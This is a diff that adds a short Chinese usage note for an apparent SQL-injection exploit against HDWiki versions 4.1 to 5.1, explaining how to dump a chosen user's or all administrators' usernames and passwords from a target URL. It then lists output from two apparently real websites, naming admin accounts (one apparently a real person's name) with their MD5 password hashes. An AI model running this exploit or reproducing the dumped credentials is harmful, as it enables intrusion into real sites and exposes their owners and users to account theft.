@@ -1,0 +1,26 @@
+使用格式分为两个
+
+1.获取指定uid用户名和密码:
+
+url uid  如 http://baidu.com 1  则是爆出uid为1的用户名和密码
+
+2.直接获取网站管理员的用户名和密码:
+
+直接输入url即可  如 http://baidu.com/hdwiki   会直接爆出当前所有具有管理权限的用户名和密码!
+
+exp测试通过4.1-5.1版本  4.0版本其实也存在此注入  不过4.0版本没报错信息! 盲注的话以后再说吧
+
+
+
+1.
+www.lusbk.com/ 2013-6-5 - 百度快照
+
+webmaster -> ea65f9624cf7760377b621610e8674f3
+陆志坚 -> c4a7b5bc2fae6bc466685de2989efa60
+2.
+
+www.salala.com.cn/wiki/ 2013-6
+
+
+salala -> 96e79218965eb72c92a549dd5a330112
+ccf -> d6e14705d69efebefe0e3c7275ca1758
